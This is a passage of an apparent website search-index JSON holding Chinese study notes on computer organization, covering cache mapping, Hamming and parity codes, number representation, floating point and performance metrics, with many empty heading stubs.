FTP\u578b","title":"\u6728\u9a6c\u5206\u7c7b"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/","text":"\u603b\u7ed3 # cache\u4e0e\u5185\u5b58\u7684\u6570\u636e\u4ea4\u4e92 # \u7ec4\u76f8\u8054\u6620\u5c04 # 14.\u67d0\u8ba1\u7b97\u673a\u7684Cache\u5171\u670916\u5757\uff0c\u91c7\u75282\u8def\u7ec4\u76f8\u8054\u6620\u5c04\u65b9\u5f0f\uff08\u5373\u6bcf\u7ec42\u5757\uff09\u3002\u6bcf\u4e2a\u4e3b\u5b58\u5757\u5927\u5c0f\u4e3a32\u5b57 \u8282\uff0c\u6309\u5b57\u8282\u7f16\u5740\u3002\u4e3b\u5b58129\u53f7\u5355\u5143\u6240\u5728\u4e3b\u5b58\u5757\u5e94\u88c5\u5165\u5230\u7684Cache\u7ec4\u53f7\u662f A .0 B. 2 C. 4 D. 6 \u6bcf\u7ec42\u5757\uff0c16/2=8\uff08\u7ec4\uff09 2^3=8, 2^5=32 \u5c06129\u8f6c\u6210\u4e8c\u8fdb\u5236\u4e3a10000001 \u8574\u542b\u7684\u4fe1\u606f\u662f\u7ec4\u53f7+3\u4f4d\u7ec4\u5185\u5e8f\u53f7+5\u4f4d\u5b57\u8282\u5e8f\u53f7 \u6240\u4ee5\u4e3a0(\u7ec4\u53f7)+100(\u7ec4\u5185\u5e8f\u53f7)+00001(\u5b57\u8282\u5e8f\u53f7) \u6240\u4ee5\u662f0\u7ec4\u7b2c4\u5757\u6570\u636e\u5757 \u5373\u5bf9\u5e94Cache\u7684\u7b2c\u56db\u7ec4 \u8ba1\u7b97\u9898 # \u78c1\u76d8\u6280\u672f\u6307\u6807\u4e0e\u6821\u9a8c # \u4e3b\u5b58\u903b\u8f91\u8bbe\u8ba1 # \u6307\u4ee4\u6d41\u7a0b\u4e0e\u5fae\u547d\u4ee4 # FT \u53d6\u503c\u64cd\u4f5c ST \u6e90\u64cd\u4f5c DT \u76ee\u7684\u64cd\u4f5c ET \u6267\u884c\u64cd\u4f5c \u57fa\u672c\u90e8\u4ef6\u548c\u6570\u636e\u901a\u8def # \uff1f\u4e0d\u77e5\u9053\u8003\u5565 \u7701\u7565 \u5e38\u89c1\u5bfb\u5740\u65b9\u5f0f # \u5faa\u73af\u5197\u4f59\u6821\u9a8c # \u6d77\u660e\u6821\u9a8c # \u6d77\u660e\u7801\u8bbe\u8ba1\u601d\u8def\uff1a\u5c06\u4fe1\u606f\u4f4d\u5206\u7ec4\u8fdb\u884c \u5076\u6821\u9a8c ->\u591a\u4e2a\u4fe1\u606f\u4f4d->\u591a\u4e2a\u6821\u9a8c\u4f4d\u6807\u6ce8\u51fa\u9519\u4f4d\u7f6e \u5076\u6821\u9a8c # \u82e5\u5206\u7ec4\u4e2d\u5b58\u5728\u5076\u6570\u4e2a1\uff0c\u5219\u6821\u9a8c\u7801\u4e3a0\uff0c\u5426\u5219\u6821\u9a8c\u7801\u4e3a1 \u9700\u8981\u7684\u6821\u9a8c\u4f4d\u6570 # \u786e\u5b9a\u6821\u9a8c\u4f4d\u7684\u4f4d\u7f6e # \u6c42\u6821\u9a8c\u7801\u7684\u503c # \u7ea0\u9519 # \u7f3a\u9677 # \u4f20\u7edf\u6d77\u660e\u7801\u80fd\u68c0\u6d4b\u5e76\u7ea0\u6b63\u4e00\u4f4d\u9519,\u53d1\u73b0\u4e24\u4f4d\u9519\uff0c\u65e0\u6cd5\u533a\u5206\u662f\u4e00\u4f4d\u9519\u8fd8\u662f\u4e24\u4f4d\u9519 \u6570\u636e\u8868\u793a\uff0c\u539f\u7801\u53cd\u7801\u8865\u7801 # \u5e26\u7b26\u53f7\u6570\u7684\u8868\u793a # \u539f\u7801 # \u53cd\u7801 # \u8865\u7801 # \u8868\u793a\u8303\u56f4 # \u7b97\u672f\u79fb\u4f4d # \u539f\u7801 # \u8865\u7801 # \u603b\u7ed3 # \u5b9a\u70b9\u6570\u548c\u6d6e\u70b9\u6570 # \u5b9a\u70b9\u6570 # \u603b\u7ed3 # \u6d6e\u70b9\u6570 # \u6d6e\u70b9\u6570\u673a\u5668\u683c\u5f0f # \u6d6e\u70b9\u6570\u89c4\u683c\u5316 # \u5c06X\u8868\u793a\u4e3a\u6d6e\u70b9\u6570 \u9898\u76ee # \u8868\u793a\u8303\u56f4\u548c\u7cbe\u5ea6 # \u8868\u793a\u8303\u56f4 \u4f8b\u9898 # \u5b9a\u70b9\u6570\u4e0e\u6d6e\u70b9\u6570\u7684\u6bd4\u8f83 # \uff081\uff09\u8868\u793a\u8303\u56f4\uff1a\u6d6e\u70b9\u6570\u6bd4\u5b9a\u70b9\u6570\u5927\uff1b \uff082\uff09\u8fd0\u7b97\u7cbe\u5ea6\uff1a\u6d6e\u70b9\u6570\u6bd4\u5b9a\u70b9\u6570\u9ad8\uff1b (3) \u8fd0\u7b97\u89c4\u5219: \u6d6e\u70b9\u6570\u6bd4\u5b9a\u70b9\u6570\u590d\u6742\uff1b \u4e58\u6cd5 # \u539f\u7801\u4e00\u4f4d\u4e58\u6cd5 # \u8865\u7801\u4e00\u4f4d\u4e58\u6cd5 # \u624b\u7b97\u8ddf\u6e90\u7801\u4e00\u6837\uff0c\u4e0d\u8981\u6c42\u8fc7\u7a0b\u76f4\u63a5\u624b\u7b97 \u8ba1\u7b97\u673a\u6027\u80fd\u7684\u4e3b\u8981\u8bc4\u4ef7\u6307\u6807 # \u57fa\u672c\u5b57\u957f \u5916\u9891 CPU\u7efc\u5408\u6027\u80fd CPU\u4e3b\u9891 \u5e73\u5747\u6bcf\u79d2\u6267\u884c\u7684\u6307\u4ee4\u6570IPS \u5e73\u5747\u6bcf\u6761\u6307\u4ee4\u7684\u65f6\u9488\u5468\u671f\u6570CPI \u6bcf\u79d2\u6267\u884c\u5b9a\u70b9/\u6d6e\u70b9\u8fd0\u7b97\u7684\u6b21\u6570 \u6570\u636e\u901a\u8def\u5bbd\u5ea6\u4e0e\u6570\u636e\u4f20\u8f93\u7387 \u5b58\u50a8\u5bb9\u91cf \u8ba1\u7b97\u9898 # \u663e\u793a\u5668 #","title":"\u603b\u7ed3"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u603b\u7ed3","text":"","title":"\u603b\u7ed3"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#cache\u4e0e\u5185\u5b58\u7684\u6570\u636e\u4ea4\u4e92","text":"","title":"cache\u4e0e\u5185\u5b58\u7684\u6570\u636e\u4ea4\u4e92"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u7ec4\u76f8\u8054\u6620\u5c04","text":"14.\u67d0\u8ba1\u7b97\u673a\u7684Cache\u5171\u670916\u5757\uff0c\u91c7\u75282\u8def\u7ec4\u76f8\u8054\u6620\u5c04\u65b9\u5f0f\uff08\u5373\u6bcf\u7ec42\u5757\uff09\u3002\u6bcf\u4e2a\u4e3b\u5b58\u5757\u5927\u5c0f\u4e3a32\u5b57 \u8282\uff0c\u6309\u5b57\u8282\u7f16\u5740\u3002\u4e3b\u5b58129\u53f7\u5355\u5143\u6240\u5728\u4e3b\u5b58\u5757\u5e94\u88c5\u5165\u5230\u7684Cache\u7ec4\u53f7\u662f A .0 B. 2 C. 4 D. 6 \u6bcf\u7ec42\u5757\uff0c16/2=8\uff08\u7ec4\uff09 2^3=8, 2^5=32 \u5c06129\u8f6c\u6210\u4e8c\u8fdb\u5236\u4e3a10000001 \u8574\u542b\u7684\u4fe1\u606f\u662f\u7ec4\u53f7+3\u4f4d\u7ec4\u5185\u5e8f\u53f7+5\u4f4d\u5b57\u8282\u5e8f\u53f7 \u6240\u4ee5\u4e3a0(\u7ec4\u53f7)+100(\u7ec4\u5185\u5e8f\u53f7)+00001(\u5b57\u8282\u5e8f\u53f7) \u6240\u4ee5\u662f0\u7ec4\u7b2c4\u5757\u6570\u636e\u5757 \u5373\u5bf9\u5e94Cache\u7684\u7b2c\u56db\u7ec4","title":"\u7ec4\u76f8\u8054\u6620\u5c04"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u8ba1\u7b97\u9898","text":"","title":"\u8ba1\u7b97\u9898"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u78c1\u76d8\u6280\u672f\u6307\u6807\u4e0e\u6821\u9a8c","text":"","title":"\u78c1\u76d8\u6280\u672f\u6307\u6807\u4e0e\u6821\u9a8c"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u4e3b\u5b58\u903b\u8f91\u8bbe\u8ba1","text":"","title":"\u4e3b\u5b58\u903b\u8f91\u8bbe\u8ba1"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u6307\u4ee4\u6d41\u7a0b\u4e0e\u5fae\u547d\u4ee4","text":"FT \u53d6\u503c\u64cd\u4f5c ST \u6e90\u64cd\u4f5c DT \u76ee\u7684\u64cd\u4f5c ET \u6267\u884c\u64cd\u4f5c","title":"\u6307\u4ee4\u6d41\u7a0b\u4e0e\u5fae\u547d\u4ee4"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u57fa\u672c\u90e8\u4ef6\u548c\u6570\u636e\u901a\u8def","text":"\uff1f\u4e0d\u77e5\u9053\u8003\u5565 \u7701\u7565","title":"\u57fa\u672c\u90e8\u4ef6\u548c\u6570\u636e\u901a\u8def"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u5e38\u89c1\u5bfb\u5740\u65b9\u5f0f","text":"","title":"\u5e38\u89c1\u5bfb\u5740\u65b9\u5f0f"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u5faa\u73af\u5197\u4f59\u6821\u9a8c","text":"","title":"\u5faa\u73af\u5197\u4f59\u6821\u9a8c"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u6d77\u660e\u6821\u9a8c","text":"\u6d77\u660e\u7801\u8bbe\u8ba1\u601d\u8def\uff1a\u5c06\u4fe1\u606f\u4f4d\u5206\u7ec4\u8fdb\u884c \u5076\u6821\u9a8c ->\u591a\u4e2a\u4fe1\u606f\u4f4d->\u591a\u4e2a\u6821\u9a8c\u4f4d\u6807\u6ce8\u51fa\u9519\u4f4d\u7f6e","title":"\u6d77\u660e\u6821\u9a8c"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u5076\u6821\u9a8c","text":"\u82e5\u5206\u7ec4\u4e2d\u5b58\u5728\u5076\u6570\u4e2a1\uff0c\u5219\u6821\u9a8c\u7801\u4e3a0\uff0c\u5426\u5219\u6821\u9a8c\u7801\u4e3a1","title":"\u5076\u6821\u9a8c"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u9700\u8981\u7684\u6821\u9a8c\u4f4d\u6570","text":"","title":"\u9700\u8981\u7684\u6821\u9a8c\u4f4d\u6570"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u786e\u5b9a\u6821\u9a8c\u4f4d\u7684\u4f4d\u7f6e","text":"","title":"\u786e\u5b9a\u6821\u9a8c\u4f4d\u7684\u4f4d\u7f6e"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u6c42\u6821\u9a8c\u7801\u7684\u503c","text":"","title":"\u6c42\u6821\u9a8c\u7801\u7684\u503c"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u7ea0\u9519","text":"","title":"\u7ea0\u9519"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u7f3a\u9677","text":"\u4f20\u7edf\u6d77\u660e\u7801\u80fd\u68c0\u6d4b\u5e76\u7ea0\u6b63\u4e00\u4f4d\u9519,\u53d1\u73b0\u4e24\u4f4d\u9519\uff0c\u65e0\u6cd5\u533a\u5206\u662f\u4e00\u4f4d\u9519\u8fd8\u662f\u4e24\u4f4d\u9519","title":"\u7f3a\u9677"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u6570\u636e\u8868\u793a\u539f\u7801\u53cd\u7801\u8865\u7801","text":"","title":"\u6570\u636e\u8868\u793a\uff0c\u539f\u7801\u53cd\u7801\u8865\u7801"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u5e26\u7b26\u53f7\u6570\u7684\u8868\u793a","text":"","title":"\u5e26\u7b26\u53f7\u6570\u7684\u8868\u793a"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u539f\u7801","text":"","title":"\u539f\u7801"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u53cd\u7801","text":"","title":"\u53cd\u7801"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u8865\u7801","text":"","title":"\u8865\u7801"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u8868\u793a\u8303\u56f4","text":"","title":"\u8868\u793a\u8303\u56f4"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u7b97\u672f\u79fb\u4f4d","text":"","title":"\u7b97\u672f\u79fb\u4f4d"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u539f\u7801_1","text":"","title":"\u539f\u7801"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u8865\u7801_1","text":"","title":"\u8865\u7801"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u603b\u7ed3_1","text":"","title":"\u603b\u7ed3"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u5b9a\u70b9\u6570\u548c\u6d6e\u70b9\u6570","text":"","title":"\u5b9a\u70b9\u6570\u548c\u6d6e\u70b9\u6570"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u5b9a\u70b9\u6570","text":"","title":"\u5b9a\u70b9\u6570"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u603b\u7ed3_2","text":"","title":"\u603b\u7ed3"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u6d6e\u70b9\u6570","text":"","title":"\u6d6e\u70b9\u6570"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u6d6e\u70b9\u6570\u673a\u5668\u683c\u5f0f","text":"","title":"\u6d6e\u70b9\u6570\u673a\u5668\u683c\u5f0f"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u6d6e\u70b9\u6570\u89c4\u683c\u5316","text":"","title":"\u6d6e\u70b9\u6570\u89c4\u683c\u5316"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u5c06x\u8868\u793a\u4e3a\u6d6e\u70b9\u6570-\u9898\u76ee","text":"","title":"\u5c06X\u8868\u793a\u4e3a\u6d6e\u70b9\u6570 \u9898\u76ee"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u8868\u793a\u8303\u56f4\u548c\u7cbe\u5ea6","text":"","title":"\u8868\u793a\u8303\u56f4\u548c\u7cbe\u5ea6"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u8868\u793a\u8303\u56f4-\u4f8b\u9898","text":"","title":"\u8868\u793a\u8303\u56f4 \u4f8b\u9898"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u5b9a\u70b9\u6570\u4e0e\u6d6e\u70b9\u6570\u7684\u6bd4\u8f83","text":"\uff081\uff09\u8868\u793a\u8303\u56f4\uff1a\u6d6e\u70b9\u6570\u6bd4\u5b9a\u70b9\u6570\u5927\uff1b \uff082\uff09\u8fd0\u7b97\u7cbe\u5ea6\uff1a\u6d6e\u70b9\u6570\u6bd4\u5b9a\u70b9\u6570\u9ad8\uff1b (3) \u8fd0\u7b97\u89c4\u5219: \u6d6e\u70b9\u6570\u6bd4\u5b9a\u70b9\u6570\u590d\u6742\uff1b","title":"\u5b9a\u70b9\u6570\u4e0e\u6d6e\u70b9\u6570\u7684\u6bd4\u8f83"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u4e58\u6cd5","text":"","title":"\u4e58\u6cd5"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u539f\u7801\u4e00\u4f4d\u4e58\u6cd5","text":"","title":"\u539f\u7801\u4e00\u4f4d\u4e58\u6cd5"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u8865\u7801\u4e00\u4f4d\u4e58\u6cd5","text":"\u624b\u7b97\u8ddf\u6e90\u7801\u4e00\u6837\uff0c\u4e0d\u8981\u6c42\u8fc7\u7a0b\u76f4\u63a5\u624b\u7b97","title":"\u8865\u7801\u4e00\u4f4d\u4e58\u6cd5"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u8ba1\u7b97\u673a\u6027\u80fd\u7684\u4e3b\u8981\u8bc4\u4ef7\u6307\u6807","text":"\u57fa\u672c\u5b57\u957f \u5916\u9891 CPU\u7efc\u5408\u6027\u80fd CPU\u4e3b\u9891 \u5e73\u5747\u6bcf\u79d2\u6267\u884c\u7684\u6307\u4ee4\u6570IPS \u5e73\u5747\u6bcf\u6761\u6307\u4ee4\u7684\u65f6\u9488\u5468\u671f\u6570CPI \u6bcf\u79d2\u6267\u884c\u5b9a\u70b9/\u6d6e\u70b9\u8fd0\u7b97\u7684\u6b21\u6570 \u6570\u636e\u901a\u8def\u5bbd\u5ea6\u4e0e\u6570\u636e\u4f20\u8f93\u7387 \u5b58\u50a8\u5bb9\u91cf","title":"\u8ba1\u7b97\u673a\u6027\u80fd\u7684\u4e3b\u8981\u8bc4\u4ef7\u6307\u6807"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u8ba1\u7b97\u9898_1","text":"","title":"\u8ba1\u7b97\u9898"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E6%80%BB%E7%BB%93/#\u663e\u793a\u5668","text":"","title":"\u663e\u793a\u5668"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E6%A6%82%E8%AE%BA/","text":"\u7b2c\u4e00\u7ae0 \u6982\u8bba # \u57fa\u672c\u7ec4\u6210 # \u5b58\u50a8\u5668 # \u6309\u4e00\u5b9a\u987a\u5e8f\u5b58\u653e\u7a0b\u5e8f\uff08\u6307\u4ee4\u548c\u6570\u636e\uff09\uff0c\u4e5f\u7528\u6765\u5b58\u653e\u8fd0\u884c\u7684\u4e2d\u95f4\u7ed3\u679c\u548c\u6700\u7ec8\u7ed3\u679c\u3002\u901a\u5e38\u662f\u5730\u5740\u7f16\u6392\uff0c\u6709\u4e00\u5b9a\u7684\u5bb9\u91cf\u5927\u5c0f\u9650\u5236\uff084G\u30018G\u300116G\uff09\u3002\u5982\u679c\u7a0b\u5e8f\u592a\u5927\u4e0d\u80fd\u5b8c\u5168\u5b58\u653e\u5728\u5b58\u50a8\u5668\u4e2d\uff0c\u5c31\u628a\u6682\u65f6\u4e0d\u7528\u7684\u6570\u636e\u5b58\u653e\u5728\u5916\u90e8\u5b58\u50a8\u5668\u4e2d\uff08\u5c5e\u4e8e\u5916\u90e8\u8bbe\u5907\uff09\u3002 \u8fd0\u7b97\u5668 # \u63a7\u5236\u5668 # \u63a7\u5236\u5668\u662f\u8ba1\u7b97\u673a\u4e2d\u7684\u201c\u795e\u7ecf\u4e2d\u67a2\u201d\uff0c\u5b83\u8d1f\u8d23\u534f\u8c03\u6574\u53f0\u8ba1\u7b97\u673a\u7684\u5de5\u4f5c\uff0c\u4e3b\u8981\u662f\u5206\u6790\u5e76\u5b89\u6392\u7a0b\u5e8f\u7684\u6267\u884c\u3002 \u5728\u73b0\u5728\u7684\u8ba1\u7b97\u673a\u4e2d\uff0c\u901a\u5e38\u628a\u8fd0\u7b97\u5668\uff08ALU\uff09\u548c\u63a7\u5236\u5668\u5408\u4e8c\u4e3a\u4e00\uff0c\u79f0\u4e4b\u4e3aCPU \u8f93\u5165\uff0c\u8f93\u51fa\u8bbe\u5907 # \u9664CPU\u548c\u5b58\u50a8\u5668\u4ee5\u5916\u7684\u5176\u5b83\u76f8\u5173\u8bbe\u5907\uff0c\u4e3b\u8981\u7528\u6765\u4f5c\u4e3a\u4eba\u673a\u4ea4\u4e92\u7684\u91cd\u8981\u624b\u6bb5\u3002\u901a\u5e38\u5f88\u591a\u8bbe\u5907\u90fd\u53ef\u4ee5\u7528\u6765\u65e2\u4f5c\u8f93\u5165\u8bbe\u5907\u4e5f\u53ef\u4ee5\u7528\u6765\u4f5c\u4e3a\u8f93\u51fa\u8bbe\u5907\u3002\u5224\u65ad\u65b9\u6cd5\u4e3b\u8981\u662f\u770b\u6570\u636e\u7684\u6d41\u5411\u3002 \u6570\u5b57\u5316\u65b9\u6cd5\u8868\u793a\u4fe1\u606f\u7684\u7279\u70b9 # (1)\u5728\u7269\u7406\u4e0a\u5bb9\u6613\u5b9e\u73b0 (2)\u6297\u5e72\u6270\u80fd\u529b\u5f3a\uff0c\u53ef\u9760\u6027\u9ad8 (3)\u6570\u503c\u7684\u8868\u793a\u8303\u56f4\u5927\uff0c\u8868\u793a\u7cbe\u5ea6\u9ad8 (4)\u53ef\u8868\u793a\u7684\u4fe1\u606f\u7c7b\u578b\u6781\u5176\u5e7f\u6cdb (5)\u80fd\u7528\u6570\u5b57\u903b\u8f91\u6280\u672f\u8fdb\u884c\u4fe1\u606f\u5904\u7406 \u5b58\u50a8\u7a0b\u5e8f\u4e0e\u51af.\u8bfa\u4f9d\u66fc\u4f53\u5236 # \u51af.\u8bfa\u4f9d\u66fc\uff08\u73b0\u4ee3\u8ba1\u7b97\u673a\u4e4b\u7236\uff09\u63d0\u51fa\u4e86\u5f53\u4ee3\u8ba1\u7b97\u673a\u7ed3\u6784\u7684\u4f53\u5236\u3002 \u3000\uff081\uff09\u91c7\u7528\u4e8c\u8fdb\u5236\u5f62\u5f0f\u8868\u793a\u6570\u636e\u548c\u6307\u4ee4 \u3000\uff082\uff09\u91c7\u7528\u5b58\u50a8\u7a0b\u5e8f\u65b9\u5f0f \u3000\uff083\uff09\u7531\u8fd0\u7b97\u5668\u3001\u5b58\u50a8\u5668\u3001\u63a7\u5236\u5668\u3001\u8f93\u5165\u8bbe\u5907\u548c\u8f93\u51fa\u8bbe\u5907\u7b49\u4e94\u5927\u90e8\u4ef6\u7ec4\u6210\u8ba1\u7b97\u673a\u7cfb\u7edf \u5b58\u50a8\u7a0b\u5e8f\u5de5\u4f5c\u65b9\u5f0f3\u4e2a\u8981\u70b9 # \uff081\uff09\u6839\u636e\u6c42\u89e3\u95ee\u9898\u4e8b\u5148\u7f16\u5236\u7a0b\u5e8f \uff082\uff09\u4e8b\u5148\u5c06\u7a0b\u5e8f\u5b58\u5165\u8ba1\u7b97\u673a\u4e2d \uff083\uff09\u8ba1\u7b97\u673a\u81ea\u52a8\u3001\u8fde\u7eed\u5730\u6267\u884c\u7a0b\u5e8f \u8ba1\u7b97\u673a\u7cfb\u7edf\u7684\u7ec4\u7ec7 # (1) CPU (2) \u5b58\u50a8\u5668 (3)\u8f93\u5165/\u8f93\u51fa\u8bbe\u5907 (4)\u603b\u7ebf (5)\u63a5\u53e3 \u603b\u7ebf # Intel 8086\u7cfb\u7edf\u7684\u7ed3\u6784 # ROM\u548cRAM\u7684\u533a\u522b # RAM\uff08random access memory\uff09\u5373\u968f\u673a\u5b58\u50a8\u5185\u5b58\uff0c\u8fd9\u79cd\u5b58\u50a8\u5668\u5728\u65ad\u7535\u65f6\u5c06\u4e22\u5931\u5176\u5b58\u50a8\u5185\u5bb9\uff0c\u6545\u4e3b\u8981\u7528\u4e8e\u5b58\u50a8\u77ed\u65f6\u95f4\u4f7f\u7528\u7684\u7a0b\u5e8f\u3002ROM\uff08Read-Only Memory\uff09\u5373\u53ea\u8bfb\u5185\u5b58\uff0c\u662f\u4e00\u79cd\u53ea\u80fd\u8bfb\u51fa\u4e8b\u5148\u6240\u5b58\u6570\u636e\u7684\u56fa\u6001\u534a\u5bfc\u4f53\u5b58\u50a8\u5668\u3002 \u5fae\u578b\u673a\u7684\u5357\u5317\u6865\u67b6\u6784 # \u8f6f\u4ef6\u7cfb\u7edf # \u8f6f\u4ef6\u5b9e\u8d28\u4e0a\u5c31\u662f\u53ef\u4ee5\u6267\u884c\u7684\u4e00 \u6bb5\u7a0b\u5e8f\u3002 \u8f6f\u4ef6\u901a\u5e38\u5206\u591a\u79cd\u7c7b\u578b\u3002\u5177\u4f53\u5982\u4e0b\uff1a 1\u3001\u7cfb\u7edf\u8f6f\u4ef6 (1) \u64cd\u4f5c\u7cfb\u7edf\u7c7b\u8f6f\u4ef6 (2)\u8bed\u8a00\u5904\u7406\u7c7b\u8f6f\u4ef6 (3)\u6570\u636e\u5e93\u7ba1\u7406\u7cfb\u7edf(DBS) (4)\u5404\u79cd\u670d\u52a1\u6027\u652f\u6491\u8f6f\u4ef6 (5)\u5404\u79cd\u6807\u51c6\u7a0b\u5e8f\u5e93 2\u3001\u5e94\u7528\u7a0b\u5e8f \u5927\u91cf\u7684\u7528\u6237\u8f6f\u4ef6\u548c\u5de5\u5177\u8f6f\u4ef6 \u8f6f\u786c\u4ef6\u5c42\u6b21\u7ed3\u6784\u6a21\u578b # \u8ba1\u7b97\u673a\u7684\u6027\u80fd\u6307\u6807 # \u5916\u9891 # \u8fd0\u7b97\u901f\u5ea6 # \u6570\u636e\u4f20\u8f93\u7387 # \u8ba1\u7b97\u9898 #","title":"\u7b2c\u4e00\u7ae0 \u6982\u8bba"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E6%A6%82%E8%AE%BA/#\u7b2c\u4e00\u7ae0-\u6982\u8bba","text":"","title":"\u7b2c\u4e00\u7ae0 \u6982\u8bba"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E6%A6%82%E8%AE%BA/#\u57fa\u672c\u7ec4\u6210","text":"","title":"\u57fa\u672c\u7ec4\u6210"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E6%A6%82%E8%AE%BA/#\u5b58\u50a8\u5668","text":"\u6309\u4e00\u5b9a\u987a\u5e8f\u5b58\u653e\u7a0b\u5e8f\uff08\u6307\u4ee4\u548c\u6570\u636e\uff09\uff0c\u4e5f\u7528\u6765\u5b58\u653e\u8fd0\u884c\u7684\u4e2d\u95f4\u7ed3\u679c\u548c\u6700\u7ec8\u7ed3\u679c\u3002\u901a\u5e38\u662f\u5730\u5740\u7f16\u6392\uff0c\u6709\u4e00\u5b9a\u7684\u5bb9\u91cf\u5927\u5c0f\u9650\u5236\uff084G\u30018G\u300116G\uff09\u3002\u5982\u679c\u7a0b\u5e8f\u592a\u5927\u4e0d\u80fd\u5b8c\u5168\u5b58\u653e\u5728\u5b58\u50a8\u5668\u4e2d\uff0c\u5c31\u628a\u6682\u65f6\u4e0d\u7528\u7684\u6570\u636e\u5b58\u653e\u5728\u5916\u90e8\u5b58\u50a8\u5668\u4e2d\uff08\u5c5e\u4e8e\u5916\u90e8\u8bbe\u5907\uff09\u3002","title":"\u5b58\u50a8\u5668"},{"location":"%E5%AD%A6%E4%B9%A0/%E8%AE%A1%E7%BB%84/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E6%A6%82%E8%